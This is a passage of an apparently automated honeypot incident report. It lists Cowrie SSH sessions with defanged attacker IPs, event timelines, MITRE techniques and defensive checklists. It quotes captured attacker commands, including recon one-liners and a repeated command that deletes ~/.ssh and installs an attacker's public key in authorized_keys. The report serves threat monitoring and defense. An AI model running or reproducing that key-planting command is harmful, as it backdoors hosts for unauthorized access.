- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6446ea061237

| Field | Detail |
|---|---|
| **Source IP** | `107.173.85[.]94` |
| **First Seen** | 2026-07-04 19:56 |
| **Last Seen** | 2026-07-04 19:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 'empty_test'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:56:02` | `cowrie.session.connect` |
| `2026-07-04 19:56:02` | `cowrie.client.version` |
| `2026-07-04 19:56:02` | `cowrie.client.kex` |
| `2026-07-04 19:56:02` | `cowrie.login.success` |
| `2026-07-04 19:56:03` | `cowrie.session.params` |
| `2026-07-04 19:56:03` | `cowrie.command.input` |
| `2026-07-04 19:56:03` | `cowrie.log.closed` |
| `2026-07-04 19:56:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.173.85[.]94` to AbuseIPDB if not already reported
- [ ] Block `107.173.85[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00caf31b28a0

| Field | Detail |
|---|---|
| **Source IP** | `107.173.85[.]94` |
| **First Seen** | 2026-07-04 19:56 |
| **Last Seen** | 2026-07-04 19:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v ls >/dev/null 2>&1 && echo ok || echo missing:ls; echo SEP; command -v ps >/dev/null 2>&1 && echo ok || echo missing:ps; echo SEP; command -v cat >/dev/null 2>&1 && echo ok || echo missing:cat; echo SEP; command -v netstat >/dev/null 2>&1 && echo ok || echo missing:netstat; echo SEP; uname -m 2>/dev/null || echo unknown; echo SEP; cat /etc/os-release 2>/dev/null | grep '^NAME=' | cut -d= -f2 | tr -d '"' || echo Linux; echo SEP; hostname 2>/dev/null || echo unknown; echo SEP; curl -s --connect-tim` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:56:08` | `cowrie.session.connect` |
| `2026-07-04 19:56:08` | `cowrie.client.version` |
| `2026-07-04 19:56:08` | `cowrie.client.kex` |
| `2026-07-04 19:56:08` | `cowrie.login.success` |
| `2026-07-04 19:56:09` | `cowrie.session.params` |
| `2026-07-04 19:56:09` | `cowrie.command.input` |
| `2026-07-04 19:56:09` | `cowrie.command.failed` |
| `2026-07-04 19:56:09` | `cowrie.command.failed` |
| `2026-07-04 19:56:09` | `cowrie.command.failed` |
| `2026-07-04 19:56:09` | `cowrie.command.failed` |
| `2026-07-04 19:56:09` | `cowrie.log.closed` |
| `2026-07-04 19:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.173.85[.]94` to AbuseIPDB if not already reported
- [ ] Block `107.173.85[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6a62bd22ebe

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 19:59 |
| **Last Seen** | 2026-07-04 19:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:59:21` | `cowrie.session.connect` |
| `2026-07-04 19:59:21` | `cowrie.client.version` |
| `2026-07-04 19:59:21` | `cowrie.client.kex` |
| `2026-07-04 19:59:21` | `cowrie.login.success` |
| `2026-07-04 19:59:21` | `cowrie.direct-tcpip.request` |
| `2026-07-04 19:59:22` | `cowrie.direct-tcpip.data` |
| `2026-07-04 19:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44ece66038b6

| Field | Detail |
|---|---|
| **Source IP** | `182.13.96[.]107` |
| **First Seen** | 2026-07-04 19:59 |
| **Last Seen** | 2026-07-04 19:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:59:31` | `cowrie.session.connect` |
| `2026-07-04 19:59:31` | `cowrie.client.version` |
| `2026-07-04 19:59:31` | `cowrie.client.kex` |
| `2026-07-04 19:59:33` | `cowrie.login.success` |
| `2026-07-04 19:59:34` | `cowrie.session.params` |
| `2026-07-04 19:59:34` | `cowrie.command.input` |
| `2026-07-04 19:59:34` | `cowrie.command.failed` |
| `2026-07-04 19:59:34` | `cowrie.log.closed` |
| `2026-07-04 19:59:35` | `cowrie.session.params` |
| `2026-07-04 19:59:35` | `cowrie.command.input` |
| `2026-07-04 19:59:35` | `cowrie.session.file_download` |
| `2026-07-04 19:59:35` | `cowrie.log.closed` |
| `2026-07-04 19:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.13.96[.]107` to AbuseIPDB if not already reported
- [ ] Block `182.13.96[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66a196fca9eb

| Field | Detail |
|---|---|
| **Source IP** | `182.13.96[.]107` |
| **First Seen** | 2026-07-04 19:59 |
| **Last Seen** | 2026-07-04 19:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:59:36` | `cowrie.session.connect` |
| `2026-07-04 19:59:36` | `cowrie.client.version` |
| `2026-07-04 19:59:36` | `cowrie.client.kex` |
| `2026-07-04 19:59:37` | `cowrie.login.success` |
| `2026-07-04 19:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.13.96[.]107` to AbuseIPDB if not already reported
- [ ] Block `182.13.96[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9779d83ad5b6

| Field | Detail |
|---|---|
| **Source IP** | `182.13.96[.]107` |
| **First Seen** | 2026-07-04 19:59 |
| **Last Seen** | 2026-07-04 19:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:59:38` | `cowrie.session.connect` |
| `2026-07-04 19:59:38` | `cowrie.client.version` |
| `2026-07-04 19:59:38` | `cowrie.client.kex` |
| `2026-07-04 19:59:39` | `cowrie.login.success` |
| `2026-07-04 19:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.13.96[.]107` to AbuseIPDB if not already reported
- [ ] Block `182.13.96[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d4b406c26ed

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 20:01 |
| **Last Seen** | 2026-07-04 20:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:01:13` | `cowrie.session.connect` |
| `2026-07-04 20:01:14` | `cowrie.client.version` |
| `2026-07-04 20:01:14` | `cowrie.client.kex` |
| `2026-07-04 20:01:21` | `cowrie.login.success` |
| `2026-07-04 20:01:24` | `cowrie.session.params` |
| `2026-07-04 20:01:24` | `cowrie.command.input` |
| `2026-07-04 20:01:25` | `cowrie.log.closed` |
| `2026-07-04 20:01:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0e2debf8f4d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 20:13 |
| **Last Seen** | 2026-07-04 20:13 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:13:09` | `cowrie.session.connect` |
| `2026-07-04 20:13:10` | `cowrie.client.version` |
| `2026-07-04 20:13:10` | `cowrie.client.kex` |
| `2026-07-04 20:13:16` | `cowrie.login.success` |
| `2026-07-04 20:13:19` | `cowrie.session.params` |
| `2026-07-04 20:13:19` | `cowrie.command.input` |
| `2026-07-04 20:13:21` | `cowrie.log.closed` |
| `2026-07-04 20:13:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-988fc64a61f8

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 20:25 |
| **Last Seen** | 2026-07-04 20:25 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:25:01` | `cowrie.session.connect` |
| `2026-07-04 20:25:02` | `cowrie.client.version` |
| `2026-07-04 20:25:02` | `cowrie.client.kex` |
| `2026-07-04 20:25:08` | `cowrie.login.success` |
| `2026-07-04 20:25:11` | `cowrie.session.params` |
| `2026-07-04 20:25:11` | `cowrie.command.input` |
| `2026-07-04 20:25:13` | `cowrie.log.closed` |
| `2026-07-04 20:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53022b84cb68

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 20:25 |
| **Last Seen** | 2026-07-04 20:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:25:53` | `cowrie.session.connect` |
| `2026-07-04 20:25:53` | `cowrie.client.version` |
| `2026-07-04 20:25:53` | `cowrie.client.kex` |
| `2026-07-04 20:25:53` | `cowrie.login.success` |
| `2026-07-04 20:25:54` | `cowrie.direct-tcpip.request` |
| `2026-07-04 20:25:54` | `cowrie.direct-tcpip.data` |
| `2026-07-04 20:25:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7d5fa094cd3

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 20:28 |
| **Last Seen** | 2026-07-04 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:28:22` | `cowrie.session.connect` |
| `2026-07-04 20:28:22` | `cowrie.client.version` |
| `2026-07-04 20:28:22` | `cowrie.client.kex` |
| `2026-07-04 20:28:23` | `cowrie.login.success` |
| `2026-07-04 20:28:23` | `cowrie.session.params` |
| `2026-07-04 20:28:23` | `cowrie.command.input` |
| `2026-07-04 20:28:23` | `cowrie.log.closed` |
| `2026-07-04 20:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7b6478931d0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 20:36 |
| **Last Seen** | 2026-07-04 20:37 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:36:53` | `cowrie.session.connect` |
| `2026-07-04 20:36:54` | `cowrie.client.version` |
| `2026-07-04 20:36:54` | `cowrie.client.kex` |
| `2026-07-04 20:37:01` | `cowrie.login.success` |
| `2026-07-04 20:37:04` | `cowrie.session.params` |
| `2026-07-04 20:37:04` | `cowrie.command.input` |
| `2026-07-04 20:37:06` | `cowrie.log.closed` |
| `2026-07-04 20:37:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bd50e868751

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-04 20:41 |
| **Last Seen** | 2026-07-04 20:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:41:50` | `cowrie.session.connect` |
| `2026-07-04 20:41:50` | `cowrie.client.version` |
| `2026-07-04 20:41:50` | `cowrie.client.kex` |
| `2026-07-04 20:41:51` | `cowrie.login.success` |
| `2026-07-04 20:41:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcd90b6b8ccc

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-04 20:41 |
| **Last Seen** | 2026-07-04 20:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:41:50` | `cowrie.session.connect` |
| `2026-07-04 20:41:50` | `cowrie.client.version` |
| `2026-07-04 20:41:50` | `cowrie.client.kex` |
| `2026-07-04 20:41:51` | `cowrie.login.success` |
| `2026-07-04 20:41:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe87b09d2fcf

| Field | Detail |
|---|---|
| **Source IP** | `218.203.203[.]232` |
| **First Seen** | 2026-07-04 20:44 |
| **Last Seen** | 2026-07-04 20:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:44:00` | `cowrie.session.connect` |
| `2026-07-04 20:44:02` | `cowrie.client.version` |
| `2026-07-04 20:44:02` | `cowrie.client.kex` |
| `2026-07-04 20:44:04` | `cowrie.login.success` |
| `2026-07-04 20:44:06` | `cowrie.session.params` |
| `2026-07-04 20:44:06` | `cowrie.command.input` |
| `2026-07-04 20:44:07` | `cowrie.log.closed` |
| `2026-07-04 20:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.203.203[.]232` to AbuseIPDB if not already reported
- [ ] Block `218.203.203[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70e349bd28a1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 20:49 |
| **Last Seen** | 2026-07-04 20:49 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:49:01` | `cowrie.session.connect` |
| `2026-07-04 20:49:02` | `cowrie.client.version` |
| `2026-07-04 20:49:02` | `cowrie.client.kex` |
| `2026-07-04 20:49:07` | `cowrie.login.success` |
| `2026-07-04 20:49:12` | `cowrie.session.params` |
| `2026-07-04 20:49:12` | `cowrie.command.input` |
| `2026-07-04 20:49:13` | `cowrie.log.closed` |
| `2026-07-04 20:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b1370fb941e

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-07-04 20:51 |
| **Last Seen** | 2026-07-04 20:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:51:54` | `cowrie.session.connect` |
| `2026-07-04 20:51:54` | `cowrie.client.version` |
| `2026-07-04 20:51:54` | `cowrie.client.kex` |
| `2026-07-04 20:51:54` | `cowrie.login.success` |
| `2026-07-04 20:51:55` | `cowrie.session.params` |
| `2026-07-04 20:51:55` | `cowrie.command.input` |
| `2026-07-04 20:51:55` | `cowrie.command.failed` |
| `2026-07-04 20:51:55` | `cowrie.log.closed` |
| `2026-07-04 20:51:56` | `cowrie.session.params` |
| `2026-07-04 20:51:56` | `cowrie.command.input` |
| `2026-07-04 20:51:56` | `cowrie.session.file_download` |
| `2026-07-04 20:51:56` | `cowrie.log.closed` |
| `2026-07-04 20:51:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3202ce16b33b

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-07-04 20:51 |
| **Last Seen** | 2026-07-04 20:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:51:56` | `cowrie.session.connect` |
| `2026-07-04 20:51:56` | `cowrie.client.version` |
| `2026-07-04 20:51:56` | `cowrie.client.kex` |
| `2026-07-04 20:51:56` | `cowrie.login.success` |
| `2026-07-04 20:51:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5e4eb968b98

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-07-04 20:51 |
| **Last Seen** | 2026-07-04 20:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:51:56` | `cowrie.session.connect` |
| `2026-07-04 20:51:56` | `cowrie.client.version` |
| `2026-07-04 20:51:56` | `cowrie.client.kex` |
| `2026-07-04 20:51:57` | `cowrie.login.success` |
| `2026-07-04 20:51:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c5ebff27ea0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-04 20:52 |
| **Last Seen** | 2026-07-04 20:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:52:15` | `cowrie.session.connect` |
| `2026-07-04 20:52:16` | `cowrie.client.version` |
| `2026-07-04 20:52:16` | `cowrie.client.kex` |
| `2026-07-04 20:52:22` | `cowrie.login.success` |
| `2026-07-04 20:52:24` | `cowrie.session.params` |
| `2026-07-04 20:52:24` | `cowrie.command.input` |
| `2026-07-04 20:52:24` | `cowrie.command.input` |
| `2026-07-04 20:52:24` | `cowrie.command.input` |
| `2026-07-04 20:52:24` | `cowrie.command.input` |
| `2026-07-04 20:52:24` | `cowrie.command.input` |
| `2026-07-04 20:52:24` | `cowrie.command.success` |
| `2026-07-04 20:52:24` | `cowrie.command.input` |
| `2026-07-04 20:52:24` | `cowrie.command.input` |
| `2026-07-04 20:52:24` | `cowrie.command.input` |
| `2026-07-04 20:52:24` | `cowrie.command.input` |
| `2026-07-04 20:52:25` | `cowrie.log.closed` |
| `2026-07-04 20:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb080f9df9d5

| Field | Detail |
|---|---|
| **Source IP** | `189.190.244[.]176` |
| **First Seen** | 2026-07-04 20:52 |
| **Last Seen** | 2026-07-04 20:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:52:24` | `cowrie.session.connect` |
| `2026-07-04 20:52:24` | `cowrie.client.version` |
| `2026-07-04 20:52:24` | `cowrie.client.kex` |
| `2026-07-04 20:52:24` | `cowrie.login.success` |
| `2026-07-04 20:52:25` | `cowrie.session.params` |
| `2026-07-04 20:52:25` | `cowrie.command.input` |
| `2026-07-04 20:52:25` | `cowrie.command.failed` |
| `2026-07-04 20:52:25` | `cowrie.log.closed` |
| `2026-07-04 20:52:26` | `cowrie.session.params` |
| `2026-07-04 20:52:26` | `cowrie.command.input` |
| `2026-07-04 20:52:26` | `cowrie.session.file_download` |
| `2026-07-04 20:52:26` | `cowrie.log.closed` |
| `2026-07-04 20:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.190.244[.]176` to AbuseIPDB if not already reported
- [ ] Block `189.190.244[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23c4e157b806

| Field | Detail |
|---|---|
| **Source IP** | `189.190.244[.]176` |
| **First Seen** | 2026-07-04 20:52 |
| **Last Seen** | 2026-07-04 20:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

